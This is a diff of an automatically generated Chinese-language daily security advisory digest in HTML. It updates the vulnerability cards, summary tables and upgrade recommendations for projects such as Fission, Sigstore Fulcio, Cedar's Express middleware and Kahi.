+                <p><strong>影响版本：</strong>go/github.com/sigstore/fulcio (<= 1.8.5) → 修复: 1.8.6</p>
+                <p><strong>CWE类型：</strong>CWE-918</p>
+                <p><strong>攻击面：</strong>可控制或劫持 OIDC Issuer 端点的攻击者</p>
+                <p><strong>触发条件：</strong>配置恶意 Issuer 返回跨主机重定向</p>
+                <p><strong>潜在危害：</strong>盲 SSRF、JWKS 缓存投毒伪造签名验证、K8s SA Token 泄露</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 Fulcio v1.8.6</p>
+            </div>
+            <a href="https://github.com/advisories/GHSA-f5mr-q85p-6hh6" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+        </div>
+        <div class="advisory-card medium">
+            <div class="advisory-header">
+                <div>
+                    <div class="advisory-title">🟡 中危 @cedar-policy/authorization-for-expressjs has an authorization bypass via query string manipulation</div>
+                    <div class="advisory-id">GHSA-g4w6-vmgf-xqvx | CVE: CVE-2026-49473</div>
+                </div>
+                <span class="priority-score">优先级: 5.5</span>
+            </div>
+            <div class="advisory-meta"><span class="badge badge-high">HIGH · CVSS 8.8</span>
+<span class="badge badge-stars">⭐ 16 (cedar-policy/authorization-for-expressjs)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
+            <div class="advisory-content">
+                <p><strong>漏洞描述：</strong>@cedar-policy/authorization-for-expressjs 使用 req.originalUrl（含查询字符串）匹配 Cedar action，而 Express 路由仅使用路径。攻击者可通过查询字符串绕过更严格的授权策略。</p>
+                <p><strong>影响产品：</strong>cedar-policy/authorization-for-expressjs ⭐16</p>
+                <p><strong>影响版本：</strong>npm/@cedar-policy/authorization-for-expressjs (<= 0.2.0) → 修复: 0.3.0</p>
+                <p><strong>CWE类型：</strong>CWE-436, CWE-863</p>
+                <p><strong>攻击面：</strong>任何已认证的远程用户</p>
+                <p><strong>触发条件：</strong>在受限端点 URL 后附加查询字符串参数（如 GET /users/?x=1）</p>
+                <p><strong>潜在危害：</strong>授权绕过——访问本应受限的端点</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 @cedar-policy/authorization-for-expressjs v0.3.0</p>
+            </div>
+            <a href="https://github.com/advisories/GHSA-g4w6-vmgf-xqvx" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+        </div>
+        <div class="advisory-card medium">
+            <div class="advisory-header">
+                <div>
+                    <div class="advisory-title">🟡 中危 Kahi has privilege-drop and socket/log permission issues</div>
+                    <div class="advisory-id">GHSA-55f6-4pr5-c7m5 | CVE: N/A</div>
+                </div>
+                <span class="priority-score">优先级: 5.5</span>
+            </div>
+            <div class="advisory-meta"><span class="badge badge-high">HIGH · CVSS N/A</span>
+<span class="badge badge-stars">⭐ 1 (kahiteam/kahi)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
+            <div class="advisory-content">
+                <p><strong>漏洞描述：</strong>Kahi v0.1.0-alpha.8 及之前三个权限问题：进程特权降级未生效（credential 未附加到子进程）、降级未重置 supplementary groups（如 docker 组）、FastCGI socket 默认可被所有本地用户访问。</p>
+                <p><strong>影响产品：</strong>kahiteam/kahi ⭐1</p>
+                <p><strong>影响版本：</strong>go/github.com/kahiteam/kahi (<= 0.1.0-alpha.8) → 修复: 0.1.0-alpha.9</p>
+                <p><strong>CWE类型：</strong>CWE-271, CWE-732</p>
+                <p><strong>攻击面：</strong>本地攻击者或需要进程隔离的场景</p>
+                <p><strong>触发条件：</strong>以 root 启动配置了 user 降级的进程，实际仍以 root 运行</p>
+                <p><strong>潜在危害：</strong>特权隔离失效，进程以高于预期的权限运行</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 Kahi v0.1.0-alpha.9</p>
+            </div>
+            <a href="https://github.com/advisories/GHSA-55f6-4pr5-c7m5" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+        </div>
         <h2 class="section-title">📊 漏洞清单汇总表</h2>
         <table class="summary-table">
-            <thead>
-                <tr>
-                    <th>序号</th>
-                    <th>评级</th>
-                    <th>GHSA编号</th>
-                    <th>影响产品</th>
-                    <th>Star数</th>
-                    <th>严重级别</th>
-                    <th>可利用性</th>
-                    <th>产品影响力</th>
-                    <th>链接</th>
-                </tr>
-            </thead>
+            <thead><tr><th>序号</th><th>评级</th><th>GHSA编号</th><th>影响产品</th><th>Star数</th><th>严重级别</th><th>可利用性</th><th>产品影响力</th><th>链接</th></tr></thead>
             <tbody>
                 <tr>
                     <td>1</td>
-                    <td>🔴紧急</td>
-                    <td><code>GHSA-wmgg/gx55/v455/m63v</code></td>
+                    <td>🔴 紧急</td>
+                    <td><code>GHSA-m63v-2g9w-2w6v</code></td>
                     <td>fission/fission</td>
-                    <td>8,869</td>
-                    <td>Critical (9.9)</td>
-                    <td>详细原理</td>
+                    <td>⭐8.9k</td>
+                    <td>CRITICAL</td>
+                    <td>有完整PoC</td>
                     <td>高</td>
-                    <td><a href="https://github.com/advisories/GHSA-wmgg-3p4h-48x7" style="color:#58a6ff;">查看</a></td>
+                    <td><a href="https://github.com/advisories/GHSA-m63v-2g9w-2w6v" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>2</td>
-                    <td>🔴紧急</td>
-                    <td><code>GHSA-7jcp-v9w4-wjmg</code></td>
-                    <td>kubevirt/kubevirt</td>
-                    <td>6,929</td>
-                    <td>Critical (9.9)</td>
-                    <td>详细原理</td>
+                    <td>🟠 高危</td>
+                    <td><code>GHSA-gx55-f84r-v3r7</code></td>
+                    <td>fission/fission</td>
+                    <td>⭐8.9k</td>
+                    <td>CRITICAL</td>
+                    <td>有详细原理</td>
                     <td>高</td>
-                    <td><a href="https://github.com/advisories/GHSA-7jcp-v9w4-wjmg" style="color:#58a6ff;">查看</a></td>
+                    <td><a href="https://github.com/advisories/GHSA-gx55-f84r-v3r7" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>3</td>
-                    <td>🔴紧急</td>
-                    <td><code>GHSA-x527-x647-q7gg</code></td>
-                    <td>golang.org/x/crypto/ssh</td>
-                    <td>3,325</td>
-                    <td>Critical (10.0)</td>
-                    <td>详细原理</td>
-                    <td>极高(核心库)</td>
-                    <td><a href="https://github.com/advisories/GHSA-x527-x647-q7gg" style="color:#58a6ff;">查看</a></td>
+                    <td>🟠 高危</td>
+                    <td><code>GHSA-v455-mv2v-5g92</code></td>
+                    <td>fission/fission</td>
+                    <td>⭐8.9k</td>
+                    <td>CRITICAL</td>
+                    <td>有详细原理</td>
+                    <td>高</td>
+                    <td><a href="https://github.com/advisories/GHSA-v455-mv2v-5g92" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>4</td>
-                    <td>🔴紧急</td>
-                    <td><code>GHSA-8c7q-86fq-vvmh</code></td>
-                    <td>mlflow/mlflow</td>
-                    <td>26,796</td>
-                    <td>Critical (9.0)</td>
-                    <td>详细原理</td>
-                    <td>极高</td>
-                    <td><a href="https://github.com/advisories/GHSA-8c7q-86fq-vvmh" style="color:#58a6ff;">查看</a></td>
+                    <td>🟠 高危</td>
+                    <td><code>GHSA-wmgg-3p4h-48x7</code></td>
+                    <td>fission/fission</td>
+                    <td>⭐8.9k</td>
+                    <td>CRITICAL</td>
+                    <td>有详细原理</td>
+                    <td>高</td>
+                    <td><a href="https://github.com/advisories/GHSA-wmgg-3p4h-48x7" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>5</td>
-                    <td>🔴紧急</td>
-                    <td><code>GHSA-hxmh-2xc4-c894</code></td>
-                    <td>Dolibarr/dolibarr</td>
-                    <td>7,358</td>
-                    <td>Critical (9.8)</td>
-                    <td>完整PoC</td>
+                    <td>🟠 高危</td>
+                    <td><code>GHSA-qcm7-3vpr-hj5h</code></td>
+                    <td>adonisjs/core</td>
+                    <td>⭐19.0k</td>
+                    <td>HIGH</td>
+                    <td>有详细原理</td>
                     <td>高</td>
-                    <td><a href="https://github.com/advisories/GHSA-hxmh-2xc4-c894" style="color:#58a6ff;">查看</a></td>
+                    <td><a href="https://github.com/advisories/GHSA-qcm7-3vpr-hj5h" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>6</td>
-                    <td>🟠高危</td>
-                    <td><code>GHSA-2c5c-chwr-9hqw</code></td>
-                    <td>netty/netty</td>
-                    <td>34,998</td>
-                    <td>High (7.5)</td>
-                    <td>完整PoC</td>
-                    <td>极高</td>
-                    <td><a href="https://github.com/advisories/GHSA-2c5c-chwr-9hqw" style="color:#58a6ff;">查看</a></td>
+                    <td>🟠 高危</td>
+                    <td><code>GHSA-j35x-w4gj-pf7w</code></td>
+                    <td>openbabel/openbabel</td>
+                    <td>⭐1.4k</td>
+                    <td>HIGH</td>
+                    <td>有完整PoC</td>
+                    <td>中</td>
+                    <td><a href="https://github.com/advisories/GHSA-j35x-w4gj-pf7w" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>7</td>
-                    <td>🟠高危</td>
-                    <td><code>GHSA-7g5w-pq96-8c5w</code></td>
-                    <td>flash-attention</td>
-                    <td>24,307</td>
-                    <td>High (7.3)</td>
-                    <td>详细原理</td>
-                    <td>极高</td>
-                    <td><a href="https://github.com/advisories/GHSA-7g5w-pq96-8c5w" style="color:#58a6ff;">查看</a></td>
+                    <td>🟠 高危</td>
+                    <td><code>GHSA-cvw6-gfvv-953q</code></td>
+                    <td>fission/fission</td>
+                    <td>⭐8.9k</td>
+                    <td>HIGH</td>
+                    <td>有详细原理</td>
+                    <td>高</td>
+                    <td><a href="https://github.com/advisories/GHSA-cvw6-gfvv-953q" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>8</td>
-                    <td>🟠高危</td>
-                    <td><code>GHSA-cw25-2p92-7f75</code></td>
-                    <td>PrefectHQ/prefect</td>
-                    <td>22,720</td>
-                    <td>High (8.5)</td>
-                    <td>详细原理</td>
-                    <td>极高</td>
-                    <td><a href="https://github.com/advisories/GHSA-cw25-2p92-7f75" style="color:#58a6ff;">查看</a></td>
+                    <td>🟠 高危</td>
+                    <td><code>GHSA-3r8v-2xmj-5c39</code></td>
+                    <td>fission/fission</td>
+                    <td>⭐8.9k</td>
+                    <td>HIGH</td>
+                    <td>有详细原理</td>
+                    <td>高</td>
+                    <td><a href="https://github.com/advisories/GHSA-3r8v-2xmj-5c39" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>9</td>
-                    <td>🟠高危</td>
-                    <td><code>GHSA-g9v5-gjwf-9rwx</code></td>
-                    <td>apache/airflow</td>
-                    <td>45,983</td>
-                    <td>High (8.1)</td>
-                    <td>仅描述</td>
-                    <td>极高</td>
-                    <td><a href="https://github.com/advisories/GHSA-g9v5-gjwf-9rwx" style="color:#58a6ff;">查看</a></td>
+                    <td>🟠 高危</td>
+                    <td><code>GHSA-gc3j-79f2-7vvw</code></td>
+                    <td>fission/fission</td>
+                    <td>⭐8.9k</td>
+                    <td>HIGH</td>
+                    <td>有详细原理</td>
+                    <td>高</td>
+                    <td><a href="https://github.com/advisories/GHSA-gc3j-79f2-7vvw" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>10</td>
-                    <td>🟠高危</td>
-                    <td><code>GHSA-m3v4-v5gx-7wf5</code></td>
-                    <td>OpenMed</td>
-                    <td>&lt;1k</td>
-                    <td>Critical (9.8)</td>
-                    <td>完整PoC</td>
-                    <td>低</td>
-                    <td><a href="https://github.com/advisories/GHSA-m3v4-v5gx-7wf5" style="color:#58a6ff;">查看</a></td>
+                    <td>🟠 高危</td>
+                    <td><code>GHSA-vjhc-cf4p-72q4</code></td>
+                    <td>fission/fission</td>
+                    <td>⭐8.9k</td>
+                    <td>HIGH</td>
+                    <td>有详细原理</td>
+                    <td>高</td>
+                    <td><a href="https://github.com/advisories/GHSA-vjhc-cf4p-72q4" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>11</td>
-                    <td>🟠高危</td>
-                    <td><code>GHSA-f5mr-q85p-6hh6</code></td>
-                    <td>sigstore/fulcio</td>
-                    <td>861</td>
-                    <td>High (8.7)</td>
-                    <td>详细原理</td>
-                    <td>中(供应链)</td>
-                    <td><a href="https://github.com/advisories/GHSA-f5mr-q85p-6hh6" style="color:#58a6ff;">查看</a></td>
+                    <td>🟠 高危</td>
+                    <td><code>GHSA-7m8x-qg2j-4m3v</code></td>
+                    <td>fission/fission</td>
+                    <td>⭐8.9k</td>
+                    <td>HIGH</td>
+                    <td>有详细原理</td>
+                    <td>高</td>
+                    <td><a href="https://github.com/advisories/GHSA-7m8x-qg2j-4m3v" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>12</td>
-                    <td>🟠高危</td>
-                    <td><code>GHSA-m5gw-83w2-7749</code></td>
-                    <td>PyFory</td>
-                    <td>4,412</td>
-                    <td>Critical (9.8)</td>
-                    <td>详细原理</td>
+                    <td>🟠 高危</td>
+                    <td><code>GHSA-5q4q-834j-g8g4</code></td>
+                    <td>Paymenter/Paymenter</td>
+                    <td>⭐1.8k</td>
+                    <td>HIGH</td>
+                    <td>有详细原理</td>
                     <td>中</td>
-                    <td><a href="https://github.com/advisories/GHSA-m5gw-83w2-7749" style="color:#58a6ff;">查看</a></td>
+                    <td><a href="https://github.com/advisories/GHSA-5q4q-834j-g8g4" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>13</td>
-                    <td>🟠高危</td>
-                    <td><code>GHSA-f26g-jm89-4g65</code></td>
-                    <td>gitoxide</td>
-                    <td>~2k</td>
-                    <td>High (7.8)</td>
-                    <td>详细原理</td>
+                    <td>🟠 高危</td>
+                    <td><code>GHSA-v5pm-xwqc-g5wc</code></td>
+                    <td>microsoft/OpenAPI.NET</td>
+                    <td>⭐1.6k</td>
+                    <td>HIGH</td>
+                    <td>有详细原理</td>
                     <td>中</td>
-                    <td><a href="https://github.com/advisories/GHSA-f26g-jm89-4g65" style="color:#58a6ff;">查看</a></td>
+                    <td><a href="https://github.com/advisories/GHSA-v5pm-xwqc-g5wc" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
                 <tr>
                     <td>14</td>
-                    <td>🟡中危</td>
-                    <td><code>GHSA-95h4-w6j8-2rp8</code></td>
-                    <td>Undertow</td>
-                    <td>3,750</td>
-                    <td>High (7.5)</td>
-                    <td>仅描述</td>
-                    <td>中</td>
-                    <td><a href="https://github.com/advisories/GHSA-95h4-w6j8-2rp8" style="color:#58a6ff;">查看</a></td>
+                    <td>🟡 中危</td>
+                    <td><code>GHSA-f5mr-q85p-6hh6</code></td>
+                    <td>sigstore/fulcio</td>
+                    <td>⭐861</td>
+                    <td>HIGH</td>
+                    <td>有详细原理</td>
+                    <td>低</td>
+                    <td><a href="https://github.com/advisories/GHSA-f5mr-q85p-6hh6" target="_blank" style="color:#58a6ff;">查看</a></td>
                 </tr>
-            </tbody>
+                <tr>
+                    <td>15</td>
+                    <td>🟡 中危</td>
+                    <td><code>GHSA-g4w6-vmgf-xqvx</code></td>
+                    <td>cedar-policy/authorization-for-expressjs</td>
+                    <td>⭐16</td>
+                    <td>HIGH</td>
+                    <td>有详细原理</td>
+                    <td>低</td>
+                    <td><a href="https://github.com/advisories/GHSA-g4w6-vmgf-xqvx" target="_blank" style="color:#58a6ff;">查看</a></td>
+                </tr>
+                <tr>
+                    <td>16</td>
+                    <td>🟡 中危</td>
+                    <td><code>GHSA-55f6-4pr5-c7m5</code></td>
+                    <td>kahiteam/kahi</td>
+                    <td>⭐1</td>
+                    <td>HIGH</td>
+                    <td>有详细原理</td>
+                    <td>低</td>
+                    <td><a href="https://github.com/advisories/GHSA-55f6-4pr5-c7m5" target="_blank" style="color:#58a6ff;">查看</a></td>
+                </tr></tbody>
         </table>
 
-        <!-- 补充：Star < 5k 但含完整 PoC 的高价值漏洞 -->
         <h2 class="section-title">📌 补充：Star &lt; 5k 但含完整 PoC 的高价值漏洞</h2>
         <table class="summary-table">
-            <thead>
-                <tr>
-                    <th>GHSA编号</th>
-                    <th>影响产品</th>
-                    <th>Star</th>
-                    <th>级别</th>
-                    <th>亮点</th>
-                </tr>
-            </thead>
+            <thead><tr><th>GHSA编号</th><th>影响产品</th><th>Star</th><th>级别</th><th>亮点</th></tr></thead>
             <tbody>
                 <tr>
-                    <td><code>GHSA-m3v4-v5gx-7wf5</code></td>
-                    <td>OpenMed</td>
-                    <td>&lt;1k</td>
-                    <td>Critical (9.8)</td>
-                    <td>未认证RCE，通过HuggingFace模型加载trust_remote_code执行任意代码</td>
+                    <td><code>GHSA-j35x-w4gj-pf7w</code></td>
+                    <td>openbabel/openbabel</td>
+                    <td>⭐1.4k</td>
+                    <td>HIGH</td>
+                    <td>🔴 PoC</td>
                 </tr>
                 <tr>
-                    <td><code>GHSA-5cgq-3rg8-m6cv</code></td>
-                    <td>golang.org/x/crypto/ssh/knownhosts</td>
-                    <td>3,325</td>
-                    <td>Critical (9.1)</td>
-                    <td>@revoked密钥吊销检查遗漏，已吊销CA密钥仍可通过认证</td>
+                    <td><code>GHSA-5q4q-834j-g8g4</code></td>
+                    <td>Paymenter/Paymenter</td>
+                    <td>⭐1.8k</td>
+                    <td>HIGH</td>
+                    <td>📖 详细分析</td>
+                </tr>
+                <tr>
+                    <td><code>GHSA-v5pm-xwqc-g5wc</code></td>
+                    <td>microsoft/OpenAPI.NET</td>
+                    <td>⭐1.6k</td>
+                    <td>HIGH</td>
+                    <td>📖 详细分析</td>
                 </tr>
                 <tr>
                     <td><code>GHSA-f5mr-q85p-6hh6</code></td>
                     <td>sigstore/fulcio</td>
-                    <td>861</td>
-                    <td>High (8.7)</td>
-                    <td>OIDC Discovery SSRF + JWKS替换 + K8s SA Token泄露，影响代码签名供应链</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-vg35-5wq7-3x7w</code></td>
-                    <td>TinyMCE</td>
-                    <td>广泛使用</td>
-                    <td>High (8.7)</td>
-                    <td>media插件data-mce-object注入导致存储型XSS，影响大量CMS系统</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-8jgf-23q5-x7xx</code></td>
-                    <td>ex_aws_sns</td>
-                    <td>&lt;1k</td>
-                    <td>High</td>
-                    <td>SigningCertURL信任攻击者控制的证书，完全绕过SNS签名验证</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-qcm7-3vpr-hj5h</code></td>
-                    <td>@adonisjs/bodyparser</td>
-                    <td>35</td>
-                    <td>High</td>
-                    <td>CVE-2026-25754的不完整修复，文件上传绕过</td>
-                </tr>
-            </tbody>
-        </table>
-
-        <!-- 其他今日更新公告简要列表 -->
-        <h2 class="section-title">📋 其他今日更新公告</h2>
-        <table class="summary-table">
-            <thead>
-                <tr>
-                    <th>GHSA编号</th>
-                    <th>产品</th>
-                    <th>级别</th>
-                    <th>摘要</th>
-                </tr>
-            </thead>
-            <tbody>
-                <tr>
-                    <td><code>GHSA-cvw6-gfvv-953q</code></td>
-                    <td>Fission</td>
-                    <td>High</td>
-                    <td>跨命名空间 Environment 引用（Function admission webhook 未验证）</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-3r8v-2xmj-5c39</code></td>
-                    <td>Fission</td>
-                    <td>High</td>
-                    <td>跨命名空间 Package 读取（Function admission webhook 未验证）</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-gc3j-79f2-7vvw</code></td>
-                    <td>Fission</td>
-                    <td>High</td>
-                    <td>跨命名空间事件泄露（KubernetesWatchTrigger 持久监控）</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-vjhc-cf4p-72q4</code></td>
-                    <td>Fission</td>
-                    <td>High</td>
-                    <td>跨命名空间 Environment 引用（Package build-time 命令执行 + SA token 泄露）</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-7m8x-qg2j-4m3v</code></td>
-                    <td>Fission</td>
-                    <td>High</td>
-                    <td>MessageQueueTrigger scaler 将 Secret 值物化到 Deployment envvars</td>
+                    <td>⭐861</td>
+                    <td>HIGH</td>
+                    <td>📖 详细分析</td>
                 </tr>
                 <tr>
                     <td><code>GHSA-g4w6-vmgf-xqvx</code></td>
-                    <td>Cedar Policy</td>
-                    <td>High</td>
-                    <td>Express.js 授权绕过（查询字符串操纵）</td>
+                    <td>cedar-policy/authorization-for-expressjs</td>
+                    <td>⭐16</td>
+                    <td>HIGH</td>
+                    <td>📖 详细分析</td>
                 </tr>
                 <tr>
-                    <td><code>GHSA-jq4m-q6p2-8gwc</code></td>
-                    <td>Hackney (Erlang)</td>
-                    <td>High</td>
-                    <td>Per-chunk timeout 无限制 body 累积导致慢速 OOM DoS</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-w879-237q-wc7r</code></td>
-                    <td>golang.org/x/crypto/ssh</td>
-                    <td>High</td>
-                    <td>病态 RSA/DSA 参数导致 DoS</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-vg35-5wq7-3x7w</code></td>
-                    <td>TinyMCE</td>
-                    <td>High</td>
-                    <td>media 插件 data-mce-object 注入导致存储型 XSS</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-gq7g-vg2q-jvq3</code></td>
-                    <td>Apache Syncope</td>
-                    <td>High</td>
-                    <td>隔离/分区不当漏洞</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-5q4q-834j-g8g4</code></td>
-                    <td>Paymenter</td>
-                    <td>High</td>
-                    <td>URL 参数注入绕过付费计划限制</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-j35x-w4gj-pf7w</code></td>
-                    <td>Open Babel</td>
-                    <td>High</td>
-                    <td>SMILES 解析器堆缓冲区溢出</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-6j7p-qjhg-9947</code></td>
-                    <td>Rucio</td>
-                    <td>Critical</td>
-                    <td>FilterEngine PostgreSQL 查询构建器 SQL 注入</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-vjr5-c9qv-hgm3</code></td>
-                    <td>Rucio</td>
-                    <td>Critical</td>
-                    <td>FilterEngine Oracle JSON Path SQL 注入</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-574f-3g2m-x479</code></td>
-                    <td>Bouncy Castle</td>
-                    <td>Critical</td>
-                    <td>GOST 28147 CTR 模式 255 块后密钥流重用</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-vgwf-h737-ff37</code></td>
-                    <td>golang.org/x/crypto/ssh</td>
-                    <td>Critical</td>
-                    <td>客户端异常响应导致服务端死锁</td>
-                </tr>
-                <tr>
-                    <td><code>GHSA-f5wc-c3c7-36mc</code></td>
-                    <td>golang.org/x/crypto/ssh/agent</td>
-                    <td>Critical</td>
-                    <td>Agent 转发密钥时未丢弃调用者约束</td>
-                </tr>
-            </tbody>
+                    <td><code>GHSA-55f6-4pr5-c7m5</code></td>
+                    <td>kahiteam/kahi</td>
+                    <td>⭐1</td>
+                    <td>HIGH</td>
+                    <td>📖 详细分析</td>
+                </tr></tbody>
         </table>
-        
-        <!-- 总结与建议 -->
+
         <h2 class="section-title">📝 总结与建议</h2>
         <div class="advisory-card">
             <div class="advisory-content">
-                <p><strong>🔴 紧急关注（立即行动）：</strong></p>
-                <ul>
-                    <li><strong>Fission 系列漏洞（4个 Critical）：</strong>如果你在使用 Fission Serverless 框架，这是最高优先级。多个独立的容器逃逸路径，从租户权限即可接管整个 K8s 集群。立即检查版本并升级，同时为 Fission 命名空间添加 Pod Security Admission 标签作为纵深防御</li>
-                    <li><strong>KubeVirt 符号链接逃逸（CVE-2026-7374）：</strong>使用 KubeVirt 管理虚拟机的环境需立即升级。该漏洞允许命名空间内用户逃逸到宿主机</li>
-                    <li><strong>golang.org/x/crypto/ssh（CVE-2026-46595，CVSS 10.0）：</strong>Go SSH 库的认证绕过影响面极广。所有使用 Go SSH 的项目都应升级至 v0.52.0+。特别注意 knownhosts @revoked 检查遗漏</li>
-                    <li><strong>MLflow 供应链投毒（CVE-2026-2651）：</strong>使用 MLflow 的 AI/ML 团队应立即升级并检查 artifact 完整性。MPU 端点未授权可被用于模型投毒</li>
-                    <li><strong>Dolibarr RCE（CVE-2018-25357）：</strong>扫描所有 Dolibarr 实例，确保 /install 目录已删除。未认证 RCE 利用极其简单</li>
-                </ul>
-                <p><strong>🟠 重点关注（本周内处理）：</strong></p>
-                <ul>
-                    <li><strong>Netty HTTP/3 DoS（CVE-2026-42582）：</strong>暴露 HTTP/3 的 Java 服务需升级 Netty，单请求即可触发 OOM</li>
-                    <li><strong>flash-attention 反序列化（CVE-2026-31253）：</strong>AI 研究团队应检查 checkpoint 加载流程，确保使用 weights_only=True</li>
-                    <li><strong>Prefect 参数注入（CVE-2026-3515）：</strong>使用 Prefect GitHub 集成的团队应审查 reference 字段输入</li>
-                    <li><strong>Airflow SSH 中间人（CVE-2026-45361）：</strong>使用 GCP ComputeEngineSSHHook 的团队升级并启用主机密钥验证</li>
-                    <li><strong>Sigstore Fulcio SSRF（CVE-2026-49478）：</strong>依赖 Sigstore 代码签名的团队应升级 Fulcio，JWKS 替换可伪造签名</li>
-                    <li><strong>PyFory 反序列化（CVE-2026-48207）：</strong>使用 Apache Fory 序列化的项目升级至 1.0.0</li>
-                    <li><strong>gitoxide 命令注入（CVE-2026-40034）：</strong>使用 gitoxide 的 Rust 项目升级至 0.83.0</li>
-                </ul>
+                <p><strong>🔴 紧急关注（Fission 系列特权逃逸漏洞）：</strong></p>
+                <ul><li><strong>GHSA-m63v-2g9w-2w6v</strong> (Fission: Environment Runtime.Container and Builder.Container) — 立即升级到 Fission v1.24.0</li></ul>
+                <p><strong>🟠 重点关注：</strong></p>
+                <ul><li><strong>GHSA-gx55-f84r-v3r7</strong> (Fission Environment CRD podspec passthrough enables hostPID/) — 升级到最新版本</li>
+<li><strong>GHSA-v455-mv2v-5g92</strong> (Fission Container Executor Function PodSpec Injection Leadin) — 升级到最新版本</li>
+<li><strong>GHSA-wmgg-3p4h-48x7</strong> (Fission Environment CRD PodSpec Injection Leading to Node Es) — 升级到最新版本</li>
+<li><strong>GHSA-qcm7-3vpr-hj5h</strong> (@adonisjs/bodyparser has an incomplete fix for CVE-2026-2575) — 升级到最新版本</li>
+<li><strong>GHSA-cvw6-gfvv-953q</strong> (Fission: Cross-namespace Environment reference via unvalidat) — 升级到最新版本</li>
+<li><strong>GHSA-3r8v-2xmj-5c39</strong> (Fission: Cross-namespace Package read via unvalidated Packag) — 升级到最新版本</li>
+<li><strong>GHSA-gc3j-79f2-7vvw</strong> (Fission: Cross-namespace event leakage via KubernetesWatchTr) — 升级到最新版本</li>
+<li><strong>GHSA-vjhc-cf4p-72q4</strong> (Fission: Cross-namespace Environment reference in Package al) — 升级到最新版本</li>
+<li><strong>GHSA-7m8x-qg2j-4m3v</strong> (Fission: MessageQueueTrigger scaler manager materializes Sec) — 升级到最新版本</li></ul>
                 <p><strong>🟡 常规关注：</strong></p>
-                <ul>
-                    <li><strong>Undertow MadeYouReset DDoS：</strong>使用 Undertow/WildFly 的服务升级以防御 HTTP/2 DDoS</li>
-                    <li><strong>Fission 跨命名空间系列（5个 High）：</strong>与 Critical 漏洞同属 Fission 安全问题，一并升级</li>
-                    <li><strong>TinyMCE XSS：</strong>使用 TinyMCE 富文本编辑器的 CMS 系统应升级以修复存储型 XSS</li>
-                    <li><strong>Hackney OOM（Erlang）：</strong>Elixir/Erlang 项目检查 Hackney 版本</li>
-                </ul>
-                <p><strong>🔍 趋势观察：</strong></p>
-                <ul>
-                    <li>本日 Fission 项目密集披露 9 个安全公告（4 Critical + 5 High），反映出对 Kubernetes Serverless 框架的系统性安全审计。这类框架因需要操作用户自定义 PodSpec 而面临固有的安全挑战</li>
-                    <li>AI/ML 供应链安全持续升温：MLflow artifact 投毒、flash-attention 反序列化、OpenMed HF 模型加载 — 三个不同层面的 ML 供应链攻击</li>
-                    <li>Go 生态核心库（golang.org/x/crypto/ssh）5 个漏洞同时披露，CVSS 最高 10.0，影响面巨大</li>
-                </ul>
+                <ul><li><strong>GHSA-j35x-w4gj-pf7w</strong> (Open Babel has heap buffer overflow in SMILES OBSmilesParser) — 按需评估升级</li>
+<li><strong>GHSA-5q4q-834j-g8g4</strong> (Paymenter has URL parameter injection that bypasses paid pla) — 按需评估升级</li>
+<li><strong>GHSA-v5pm-xwqc-g5wc</strong> (Microsoft.OpenAPI: Circular schema references may terminate ) — 按需评估升级</li>
+<li><strong>GHSA-f5mr-q85p-6hh6</strong> (Fulcio has OIDC Discovery Redirect Following Allows SSRF and) — 按需评估升级</li>
+<li><strong>GHSA-g4w6-vmgf-xqvx</strong> (@cedar-policy/authorization-for-expressjs has an authorizati) — 按需评估升级</li>
+<li><strong>GHSA-55f6-4pr5-c7m5</strong> (Kahi has privilege-drop and socket/log permission issues) — 按需评估升级</li></ul>
             </div>
         </div>
     </div>
-    
     <footer>
         <p>每日 08:10 自动生成 · 数据来源: GitHub Advisory Database</p>
         <p><a href="https://github.com/JsHuang/sec-advisory-daily">GitHub 仓库</a></p>
